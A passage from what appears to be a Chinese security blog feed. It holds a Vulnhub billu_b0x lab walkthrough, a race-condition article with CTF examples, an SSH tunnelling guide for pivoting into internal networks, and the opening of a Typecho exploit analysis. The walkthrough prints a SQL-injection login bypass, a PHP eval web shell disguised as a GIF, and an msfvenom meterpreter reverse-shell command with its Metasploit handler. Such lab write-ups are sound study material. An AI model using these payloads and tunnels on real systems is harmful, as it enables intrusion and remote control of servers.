class="hljs-regexp">/phpmy/</span>    <br>+ http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">134.130</span>/server-status (CODE:<span class="hljs-number">403</span>|SIZE:<span class="hljs-number">296</span>)<br>+ http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">134.130</span>/show (CODE:<span class="hljs-number">200</span>|SIZE:<span class="hljs-number">1</span>)<br>+ http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">134.130</span>/test (CODE:<span class="hljs-number">200</span>|SIZE:<span class="hljs-number">72</span>)<br>==&gt; DIRECTORY: http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">134.130</span>/uploaded_images<br></code></pre></td></tr></table></figure><h3 id="2-2-渗透测试"><a href="#2-2-渗透测试" class="headerlink" title="2.2 渗透测试"></a>2.2 渗透测试</h3><p>对收集到的东西进行简单测试。挨个访问一下扫到的目录，暂时找到些有用的：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">134.130</span>/add<br>一个图片上传页面。<br>http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">134.130</span>/<span class="hljs-keyword">in</span><br>phpinfo()<br>http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">134.130</span>/test<br>提示<span class="hljs-string">&quot;&#x27;file&#x27; parameter is empty. Please provide file path in &#x27;file&#x27; parameter&quot;</span><br>http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">134.130</span><span class="hljs-regexp">/phpmy/</span><br>phpmyadmin<br>http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">134.130</span>/index<br>主页<br></code></pre></td></tr></table></figure><p>首先是<code>http://192.168.134.130/test</code>,直接访问显示:</p><p><img src="https://image.mengsec.com/Vulnhub-billub0x-Writeup-2.png"></p><p>尝试POST一个<code>file=index.php</code>。发现可以下载。<code>file=/etc/passwd</code>也可以下载，存在任意文件下载漏洞。</p><p><img src="https://image.mengsec.com/Vulnhub-billub0x-Writeup-3.png"></p><p>根据之前扫到的目录，可以将源代码全部下载下来：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">add<span class="hljs-selector-class">.php</span> <span class="hljs-keyword">in</span><span class="hljs-selector-class">.php</span> head<span class="hljs-selector-class">.php</span> index<span class="hljs-selector-class">.php</span> panel<span class="hljs-selector-class">.php</span> show<span class="hljs-selector-class">.php</span> test.php<br></code></pre></td></tr></table></figure><p>打开<code>c.php</code>:</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade"><span class="hljs-symbol">$co</span>nn = mysqli_connect(<span class="hljs-string">&quot;127.0.0.1&quot;</span>,<span class="hljs-string">&quot;billu&quot;</span>,<span class="hljs-string">&quot;b0x_billu&quot;</span>,<span class="hljs-string">&quot;ica_lab&quot;</span>);<br></code></pre></td></tr></table></figure><p>得到了数据库的账号密码<code>billu:b0x_billu</code>,这样就可以登录<code>phpmyadmin</code>了,由于Mysql权限比较低，不能写shell。但在首页可以知道<code>phpmyadmin</code>的版本是<strong>3.4.7</strong>,尝试在搜索引擎上找漏洞，没啥收获。</p><p>不过查到了<code>phpmyadmin</code>的配置文件中会有服务器的账号密码，借助之前的那个任意文件下载，我们可以获得配置文件<code>config.inc.php</code>。</p><p><img src="https://image.mengsec.com/Vulnhub-billub0x-Writeup-4.png"></p><p>就直接获取了靶机的root的账号密码<code>root:roottoor</code></p><p><img src="https://image.mengsec.com/Vulnhub-billub0x-Writeup-5.png"></p><p>再加上靶机开着ssh服务，直接ssh连接登录就行。</p><p>虽然目的达到了，但拿到权限的方法肯定不止这一种，继续寻找。<br>然后我找到了两种登录的方法。<br>一是从<code>phpmyadmin</code>中登录数据库，我们可以在auth表里面获得账号密码</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">uname:</span>biLLu<br><span class="hljs-symbol">pass:</span>hEx_it<br></code></pre></td></tr></table></figure><p>二是从index.php中，我们可以找到实现登录功能的代码：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-variable">$uname</span>=str_replace(<span class="hljs-string">&#x27;\&#x27;&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>,urldecode(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;un&#x27;</span>]));<br><span class="hljs-variable">$pass</span>=str_replace(<span class="hljs-string">&#x27;\&#x27;&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>,urldecode(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;ps&#x27;</span>]));<br><span class="hljs-variable">$run</span>=<span class="hljs-string">&#x27;select * from auth where  pass=\&#x27;&#x27;</span>.<span class="hljs-variable">$pass</span>.<span class="hljs-string">&#x27;\&#x27; and uname=\&#x27;&#x27;</span>.<span class="hljs-variable">$uname</span>.<span class="hljs-string">&#x27;\&#x27;&#x27;</span>;<br><span class="hljs-variable">$result</span> = mysqli_query(<span class="hljs-variable">$conn</span>, <span class="hljs-variable">$run</span>);<br></code></pre></td></tr></table></figure><p>可以看到进行查询的SQL语句，可以构造<code>un=or 1=1 %23\&amp;ps=or 1=1 %23\</code>来绕过验证，实现登录,或者直接注入出账号密码，两个方式都行。</p><p>对panel.php进行代码审计，发现一个本地文件包含漏洞</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;continue&#x27;</span>]))<br>&#123;<br><span class="hljs-variable">$dir</span>=getcwd();<br><span class="hljs-variable">$choice</span>=str_replace(<span class="hljs-string">&#x27;./&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;load&#x27;</span>]);<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$choice</span>===<span class="hljs-string">&#x27;add&#x27;</span>)<br>&#123;<br>       <span class="hljs-keyword">include</span>(<span class="hljs-variable">$dir</span>.<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-variable">$choice</span>.<span class="hljs-string">&#x27;.php&#x27;</span>);<br><span class="hljs-keyword">die</span>();<br>&#125;<br><br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$choice</span>===<span class="hljs-string">&#x27;show&#x27;</span>)<br>&#123;<br>        <br><span class="hljs-keyword">include</span>(<span class="hljs-variable">$dir</span>.<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-variable">$choice</span>.<span class="hljs-string">&#x27;.php&#x27;</span>);<br><span class="hljs-keyword">die</span>();<br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br><span class="hljs-keyword">include</span>(<span class="hljs-variable">$dir</span>.<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;load&#x27;</span>]);<br>&#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://image.mengsec.com/Vulnhub-billub0x-Writeup-6.png"></p><p>接下来找个地方上传一个包含php代码的文件即可。<br>登录之后，在添加用户<code>Add User</code>的地方正好有个上传图片文件的地方。</p><p><img src="https://image.mengsec.com/Vulnhub-billub0x-Writeup-7.png"></p><p>创建一个<code>mengchen.gif</code>文件，内容如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">GIF89a<span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>直接上传文件，根据<code>panel.php</code>中第76行代码：</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs prolog">move_uploaded_file($<span class="hljs-symbol">_FILES</span>[<span class="hljs-string">&#x27;image&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>], <span class="hljs-string">&#x27;uploaded_images/&#x27;</span>.$<span class="hljs-symbol">_FILES</span>[<span class="hljs-string">&#x27;image&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>])<br></code></pre></td></tr></table></figure><p>上传的文件在<code>uploaded_images</code>中，直接访问<code>http://192.168.134.130/uploaded_images/</code>就能看到</p><p><img src="https://image.mengsec.com/Vulnhub-billub0x-Writeup-8.png"></p><p>这样就可以借助本地文件包含漏洞来执行shell了。</p><p><img src="https://image.mengsec.com/Vulnhub-billub0x-Writeup-9.png"></p><p>现在我是<code>www-data</code>权限。但是使用数据包很不方便，使用<code>msfvenom</code>生成一个WebShell：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">msfvenom -p php/meterpreter_reverse_tcp <span class="hljs-attribute">LHOST</span>=192.168.134.132 <span class="hljs-attribute">LPORT</span>=23456 -f<span class="hljs-built_in"> raw </span>&gt; mengchen3.php<br></code></pre></td></tr></table></figure><p>然后将WebShell打开，前面加上<code>GIF89a</code>，并且将扩展名改为gif并上传。</p><p>在Kali上,打开<code>metasploit</code>，执行如下命令：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs routeros">use exploit/multi/handler<br><span class="hljs-builtin-name">set</span> PAYLOAD php/meterpreter_reverse_tcp<br><span class="hljs-builtin-name">set</span> LHOST 192.168.134.132 <br><span class="hljs-builtin-name">set</span> LPORT 23456<br>exploit<br></code></pre></td></tr></table></figure><p>然后使用burp发包，执行上传的WebShell。成功的返回了一个<code>Meterpreter</code>。</p><p><img src="https://image.mengsec.com/Vulnhub-billub0x-Writeup-10.png"></p><p>创建一个shell，执行<code>uname -a</code>查看一下内核版本。</p><p><img src="https://image.mengsec.com/Vulnhub-billub0x-Writeup-11.png"></p><p>因为我现在只是<code>www-data</code>用户权限，需要找一下内核漏洞来进行提权。</p><p><a href="https://www.exploit-db.com/exploits/37292/">Linux Kernel 3.13.0 &lt; 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - ‘overlayfs’ Local Privilege Escalation</a></p><p>将代码保存到kali上，<code>exploit.c</code>。接着使用Meterpreter的upload命令，将exp上传到靶机的tmp目录下，使用gcc编译执行，成功获取到了root权限。</p><p><img src="https://image.mengsec.com/Vulnhub-billub0x-Writeup-12.png"></p>]]></content>
    
    
    
    <tags>
      
      <tag>Vulnhub</tag>
      
      <tag>渗透测试</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>条件竞争（Race Condition）</title>
    <link href="/2018/04/07/Race-Condition/"/>
    <url>/2018/04/07/Race-Condition/</url>
    
    <content type="html"><![CDATA[<p>在0CTF2018中划了划水，学到了不少东西，赛后总结整理下”条件竞争”漏洞知识点。</p><a id="more"></a><h2 id="1-漏洞简介"><a href="#1-漏洞简介" class="headerlink" title="1. 漏洞简介"></a>1. 漏洞简介</h2><p>条件竞争是指一个系统的运行结果依赖于不受控制的事件的先后顺序。当这些不受控制的事件并没有按照开发者想要的方式运行时，就可能会出现 bug。尤其在当前我们的系统中大量对资源进行共享，如果处理不当的话，就会产生条件竞争漏洞。</p><p>来举个例子:</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs stata">#-*-coding:utf-8-*-<br>import threading<br><span class="hljs-keyword">COUNT</span> = 0<br><br>def <span class="hljs-keyword">Run</span>(threads_name):<br><span class="hljs-keyword">global</span> <span class="hljs-keyword">COUNT</span><br>read_value = <span class="hljs-keyword">COUNT</span><br><span class="hljs-keyword">print</span> <span class="hljs-string">&quot;COUNT in Thread-%s is %d&quot;</span> % (str(threads_name), read_value)<br><span class="hljs-keyword">COUNT</span> = read_value + 1<br><br>def main():<br>threads = []<br><span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-keyword">range</span>(10):<br>t = threading.Thread(target=<span class="hljs-keyword">Run</span>,<span class="hljs-keyword">args</span>=(j,))<br>threads.<span class="hljs-keyword">append</span>(t)<br>t.start()<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-keyword">range</span>(len(threads)):<br>threads[i].join()<br><span class="hljs-keyword">print</span>(<span class="hljs-string">&quot;Finally, The COUNT is %d&quot;</span> % (<span class="hljs-keyword">COUNT</span>,))<br><br><span class="hljs-keyword">if</span> __name__ == &#x27;__main__&#x27;:<br>main()<br><br></code></pre></td></tr></table></figure><p>这是一个很简单的多线程计数，按照程序的逻辑，到程序执行完毕，<code>COUNT</code>的值应该是10，但事实并不是这样，<code>COUNT</code>的值不但达不到10，而且每次执行的效果都不一样。</p><p><img src="https://image.mengsec.com/Race%20Condition-1.png"></p><p>Why？</p><p>我们可以假设，当<code>COUNT</code>是3时，线程th1读取<code>COUNT</code>，然后读取到了3，然后CPU将控制权给了线程th2,线程th2同样对其进行读取，还是3，然后接下来th1和th2都将<code>COUNT</code>加到4，然而我们的预期是加到5。在这里，程序中多个线程之间就产生了资源竞争，这种情况发生了多次，于是最后的结果就和我们的预期不一样了。</p><h2 id="2-Web中的条件竞争"><a href="#2-Web中的条件竞争" class="headerlink" title="2. Web中的条件竞争"></a>2. Web中的条件竞争</h2><p>由于网站的特殊性，Web服务器处理多用户的请求时，是并发进行的，因此，如果并发处理不当或者相关逻辑操作设计的不合理的时候，就会导致条件竞争漏洞。简单点说就是在你要做一件事情的时候用很快的速度插了个队并做了另外一件事。而这就导致了一些不好的事情。</p><p>在很多网站中都会包含上传文件或者从远端获取文件保存在服务器的功能，比如修改头像。来看一个简单的例子：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>  <span class="hljs-keyword">if</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;error&quot;</span>] &gt; <span class="hljs-number">0</span>))&#123;<br>    move_uploaded_file(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;tmp_name&quot;</span>],<span class="hljs-string">&quot;upload/&quot;</span> . <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;name&quot;</span>]);<br>    <span class="hljs-comment">//check file</span><br>    unlink(<span class="hljs-string">&quot;upload/&quot;</span>._FILES[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;name&quot;</span>]));<br>    <span class="hljs-comment">//...</span><br> &#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>这段代码看似一切正常，先将上传的文件上传到Web目录，然后检查文件的安全性，如果发现文件不安全就马上通过<code>unlink()</code>将其删除。但是，当程序在服务端并发处理用户请求时问题就来了。如果在文件上传成功后但是在相关安全检查发现它是不安全文件删除它以前，这个文件就被执行了那么会怎样呢？</p><p>假设攻击者上传了一个用来生成恶意shell的文件，在上传完成和安全检查完成并删除它的间隙，攻击者通过不断地发起访问请求的方法访问了该文件，该文件就会被执行，并且在服务器上生成一个恶意shell。至此，该文件的任务就已全部完成，至于后面发现它是一个不安全的文件并把它删除的问题都已经不重要了，因为攻击者已经成功的入侵了服务器。</p><h2 id="3-CTF实例"><a href="#3-CTF实例" class="headerlink" title="3. CTF实例"></a>3. CTF实例</h2><h3 id="3-1-CUMT平台上的-上传三"><a href="#3-1-CUMT平台上的-上传三" class="headerlink" title="3.1 CUMT平台上的 上传三"></a>3.1 CUMT平台上的 上传三</h3><p><a href="http://202.119.201.199/challenge/web/uploadfile/">题目地址</a></p><p>使用burp抓包上传一个shell，先将文件名改成<code>233.jpg</code></p><p><img src="https://image.mengsec.com/Race%20Condition-2.png"></p><p>要求上传可执行文件，改成<code>233.php</code></p><p><img src="https://image.mengsec.com/Race%20Condition-3.png"></p><p>两个flag到手</p><p>然后告诉你这个文件扩展名在黑名单里，尝试<code>php4</code>,<code>php5</code>,<code>phtml</code>,发现<code>phtml</code>不在黑名单，但文件还是被删掉了。</p><p><img src="https://image.mengsec.com/Race%20Condition-4.png"></p><p>文件还是在服务器中存在过的，这就存在了条件竞争漏洞，在文件被删除之前，我们可以访问它来执行命令。</p><p>先写个py脚本循环访问上传的文件，然后burp的Intruder模块多次上传文件，即可获得flag。</p><figure class="highlight processing"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs processing"><span class="hljs-keyword">import</span> requests<br>url = <span class="hljs-string">&#x27;http://202.119.201.199/challenge/web/uploadfile/upload/233.phtml&#x27;</span><br><span class="hljs-keyword">while</span> True:<br>    r = requests.<span class="hljs-built_in">get</span>(url)<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;flag&#x27;</span> in  r.<span class="hljs-built_in">text</span>:<br>        <span class="hljs-built_in">print</span> r.<span class="hljs-built_in">text</span><br></code></pre></td></tr></table></figure><p><img src="https://image.mengsec.com/Race%20Condition-5.png"></p><h3 id="3-2-0CTF2018-Easy-User-Manage-System"><a href="#3-2-0CTF2018-Easy-User-Manage-System" class="headerlink" title="3.2 0CTF2018-Easy User Manage System"></a>3.2 0CTF2018-Easy User Manage System</h3><p>题目中把IP当作手机，通过开放80端口的HTTP服务来接收注册账号时的验证码。<br>收到的验证码在HTTP的请求头里。</p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs accesslog"><span class="hljs-number">202.120.7.196</span> - - <span class="hljs-string">[03/Apr/2018 20:31:15]</span> <span class="hljs-string">&quot;<span class="hljs-keyword">HEAD</span> /?037d95ce2da397602f4acc0b3227fcbc HTTP/1.1&quot;</span> <span class="hljs-number">200</span> -<br></code></pre></td></tr></table></figure><p>注册完账号后，发现提示</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">If you make your phone <span class="hljs-selector-tag">to</span> be <span class="hljs-number">8.8</span>.<span class="hljs-number">8.8</span>, <span class="hljs-selector-tag">I</span> will give you <span class="hljs-selector-tag">a</span> flag.<br></code></pre></td></tr></table></figure><p>其中还给了一个页面用来修改IP地址。</p><p><img src="https://image.mengsec.com/20180CTF-Web-EUMS-1.png" alt="image"></p><p>题目考察的是多个session进行条件竞争。</p><p>我们首先成功注册一个账号，并且通过IP验证，为了实现有多个session，分别在两个不同的浏览器上登陆。</p><p><img src="https://image.mengsec.com/20180CTF-Web-EUMS-2.png" alt="image"></p><p>此时两个都在登录状态，然后都到修改IP的那个界面，其中一个提交自己VPS的IP，如果IP地址重复的话，可以通过IP的16进制来进行绕过，提交之后就会跳转，让你输入验证码，输入验证码后暂时不用提交，此时去另一个浏览器上页面填写IP地址为8.8.8.8。如图：</p><p><img src="https://image.mengsec.com/20180CTF-Web-EUMS-3.png" alt="image"></p><p>然后直接使用burp进行抓包，先点击提交8.8.8.8IP的那个，然后再提交验证码，这两个包都会被burp拦截，然后直接点击Intercept off放行，即可获得flag。</p><p><img src="https://image.mengsec.com/20180CTF-Web-EUMS-4.png" alt="image"></p><p>在该题目中，服务器通过session对请求顺序建立了锁，因此我们需要多个session，使用两个浏览器登录同一个账户即可。在将IP改为8.8.8.8时，有短时间的网络请求堵塞，我们在这个时间段，使用另一个session提交请求，即可通过验证，成功将IP改为8.8.8.8，然后获得flag。这个题目算是一个对数据库操作的条件竞争漏洞的典型例子。</p><h2 id="4-总结以及漏洞修复"><a href="#4-总结以及漏洞修复" class="headerlink" title="4. 总结以及漏洞修复"></a>4. 总结以及漏洞修复</h2><p>条件竞争漏洞产生的很大一部分原因是程序不严谨，对于并发操作没有做好限制，毕竟开发者在进行代码开发的时候，常常倾向于代码会以线性的方式执行，而并行服务器会同时执行多个线程，这就会导致意想不到的结果。</p><p>条件竞争漏洞的修复主要看开发者，以上述的Web漏洞为例：</p><ul><li>对于数据库的操作，比较正统的方法是设置锁</li><li>对于文件上传，“引狼入室”的方法不可取，最好在上传到目录之前就进行充分的检测，最好使用白名单。</li></ul><h2 id="5-参考链接"><a href="#5-参考链接" class="headerlink" title="5. 参考链接"></a>5. 参考链接</h2><ul><li><a href="http://www.361way.com/python-thread/3425.html">http://www.361way.com/python-thread/3425.html</a></li><li><a href="http://wiki.secbug.net/web_race-condtion.html">http://wiki.secbug.net/web_race-condtion.html</a></li><li><a href="https://blog.csdn.net/u011377996/article/details/79511160">https://blog.csdn.net/u011377996/article/details/79511160</a></li><li><a href="https://coxxs.me/676">https://coxxs.me/676</a></li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>条件竞争</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SSH正向代理与反向代理</title>
    <link href="/2017/12/26/SSH%E6%AD%A3%E5%90%91%E4%BB%A3%E7%90%86%E4%B8%8E%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86/"/>
    <url>/2017/12/26/SSH%E6%AD%A3%E5%90%91%E4%BB%A3%E7%90%86%E4%B8%8E%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86/</url>
    
    <content type="html"><![CDATA[<p>在X-NUCA 2017决赛中用到了些内网穿透的知识，但是我只会用reGeorg+Proxychains来进行内网穿透，效果很不理想，赛后研究下用SSH来内网穿透。</p><a id="more"></a><h2 id="1-知识点"><a href="#1-知识点" class="headerlink" title="1. 知识点"></a>1. 知识点</h2><h3 id="1-1-准备工作"><a href="#1-1-准备工作" class="headerlink" title="1.1 准备工作"></a>1.1 准备工作</h3><p>开启SSH的转发功能:在<code>/etc/ssh/sshd_config</code>中末尾加入</p><pre><code>GatewayPorts yes</code></pre><p>然后重启SSH</p><pre><code>service ssh restart</code></pre><h3 id="1-2-正向代理"><a href="#1-2-正向代理" class="headerlink" title="1.2 正向代理"></a>1.2 正向代理</h3><p>正向代理的典型例子是主机(A)通过一台可以访问的主机(B)访问主机(C)提供的服务。 主机A不能直接访问主机C提供的服务，但是主机A可以访问主机B，主机B可以访问到主机C的服务，那我们可以在主机A上使用以下命令</p><pre><code>ssh -CNfL a_port:c_ip:c_port b_user@b_ip</code></pre><h3 id="1-3-反向代理"><a href="#1-3-反向代理" class="headerlink" title="1.3 反向代理"></a>1.3 反向代理</h3><p>反向代理的作用可以认为是把内网中的主机(A)暴露出来，以便于所有的主机都可以访问到主机A的服务。假定我们使用一台公网可以访问的主机(B)来给主机A做反向代理，那么命令如下</p><pre><code>ssh -CNfR b_port:127.0.0.1:a_port b_user@b_ip</code></pre><h3 id="1-4-SSH参数介绍"><a href="#1-4-SSH参数介绍" class="headerlink" title="1.4 SSH参数介绍"></a>1.4 SSH参数介绍</h3><ul><li>-N 告诉 SSH 客户端，这个连接不需要执行任何命令，也就是说不需要打开远程 shell，仅仅做端口转发；</li><li>-T 不为这个连接分配 TTY。其中 -N,-T 两个参数可以放在一起用，代表这个 SSH 连接只用来传数据，不执行远程操作；</li><li>-f 告诉SSH客户端在后台运行，要关闭这个后台连接，就只有用 kill 命令去杀掉进程；</li><li>-L 做本地映射端口，需要注意被冒号分割的三个部分含义，下面做详细介绍；</li><li>-C 压缩数据传输；</li><li>-g (GatewayPorts) 默认只转发本地发送的数据，如果要转发其它服务器的客户端请求，则需要添加该参数。</li></ul><h2 id="2-拓扑"><a href="#2-拓扑" class="headerlink" title="2. 拓扑"></a>2. 拓扑</h2><p><img src="https://image.mengsec.com/Blog_SSH%E6%AD%A3%E5%90%91%E4%BB%A3%E7%90%86%E4%B8%8E%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86_tuopu.png"></p><h2 id="3-测试"><a href="#3-测试" class="headerlink" title="3. 测试"></a>3. 测试</h2><p>从上面的拓扑图中，hacker是不能直接访问处于内网中的Web服务器的Web服务。我们可以通过中间的代理服务器来建立一条SSH隧道来达成这一目的。</p><p>第一步，将内网的Web服务器反向连接到中间的代理服务器中。</p><p>执行命令</p><pre><code>ssh -p 22 -qngfNTR 6666:localhost:22 root@172.19.0.2</code></pre><p><img src="https://image.mengsec.com/Blog_SSH%E6%AD%A3%E5%90%91%E4%BB%A3%E7%90%86%E4%B8%8E%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86_1.png"></p><p>然后查看Web服务器中的进程</p><p><img src="https://image.mengsec.com/Blog_SSH%E6%AD%A3%E5%90%91%E4%BB%A3%E7%90%86%E4%B8%8E%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86_2.png"></p><p>此时在代理服务器上，已经开始在6666端口开始监听了。</p><p><img src="https://image.mengsec.com/Blog_SSH%E6%AD%A3%E5%90%91%E4%BB%A3%E7%90%86%E4%B8%8E%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86_3.png"></p><p>第二步，hacker在自己机器上执行命令</p><pre><code>ssh -p 6666 -qngfNTD 6767 root@172.17.0.3</code></pre><p>执行之后就可以直接穿透网络，进入到内网，本地使用代理127.0.0.1：6767就能访问到内网中。</p><p>我们直接在Web服务器上用python开启一个HTTP服务</p><p><img src="https://image.mengsec.com/Blog_SSH%E6%AD%A3%E5%90%91%E4%BB%A3%E7%90%86%E4%B8%8E%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86_4.png"></p><p>然后在hacker中使用proxychains进行代理访问127.0.0.1的8080端口，即可成功的访问到刚刚用python开启的Web服务</p><p><img src="https://image.mengsec.com/Blog_SSH%E6%AD%A3%E5%90%91%E4%BB%A3%E7%90%86%E4%B8%8E%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86_5.png"></p><p>于此，我们成功的在hacker与内网之间建立了一条SSH隧道。</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://www.anquanke.com/post/id/86596" title="SSH如何反向代理稳定穿透内网">SSH如何反向代理稳定穿透内网</a></p><p><a href="http://blog.csdn.net/dliyuedong/article/details/49804825" title="SSH正向与反向代理">SSH正向与反向代理</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>内网穿透</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Typecho v1.1 前台Getshell漏洞分析</title>
    <link href="/2017/11/25/Typecho-v1-1-%E5%89%8D%E5%8F%B0Getshell%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    <url>/2017/11/25/Typecho-v1-1-%E5%89%8D%E5%8F%B0Getshell%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<p>Typecho v1.1-15.5.12 前台反序列化可写Shell。<br>这个洞出了得有一个月了，当时出的时候想要审一下，但是PHP水平不太够，没审出来，于是等了等大牛们的博客。重新梳理了下流程，在此记录一下。</p><a id="more"></a><h2 id="0x00-源码下载"><a href="#0x00-源码下载" class="headerlink" title="0x00 源码下载"></a>0x00 源码下载</h2><blockquote><p><a href="https://github.com/typecho/typecho/releases/tag/v1.1-15.5.12-beta">https://github.com/typecho/typecho/releases/tag/v1.1-15.5.12-beta</a></p></blockquote><h2 id="0x01-Payload"><a href="#0x01-Payload" class="headerlink" title="0x01 Payload"></a>0x01 Payload</h2><h3 id="1-Exp生成脚本"><a href="#1-Exp生成脚本" class="headerlink" title="1. Exp生成脚本"></a>1. Exp生成脚本</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span 